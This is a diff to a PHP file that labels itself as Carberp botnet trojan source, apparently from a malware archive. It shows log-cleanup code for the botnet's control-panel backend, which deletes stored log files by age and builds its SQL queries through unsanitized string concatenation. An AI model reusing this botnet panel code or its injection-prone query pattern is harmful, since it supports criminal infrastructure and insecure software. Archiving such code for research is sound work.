@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(-1);
@@ -22,12 +33,15 @@ $type = 'gra';
 
 $file = scandir($dir . '/logs/unnecessary/'.$type.'/');
 unset($file[0], $file[1]);
-foreach($file as $f){	$fi =$dir . '/logs/unnecessary/'.$type.'/' . $f;
+foreach($file as $f){
+	$fi =$dir . '/logs/unnecessary/'.$type.'/' . $f;
 	$q = $mysqli->query('SELECT id FROM bf_unnecessary WHERE (md5 = \''.$f.'\') LIMIT 1');
-	if(empty($q->id)){		//echo $fi . "<br>";
+	if(empty($q->id)){
+		//echo $fi . "<br>";
 		//unlink($fi);
 		$count++;
-	}else{		if((time() - filemtime($fi)) > (2678400 * 3)){
+	}else{
+		if((time() - filemtime($fi)) > (2678400 * 3)){
 			//echo $fi . "<br>";
 			unlink($fi);
 			$count++;
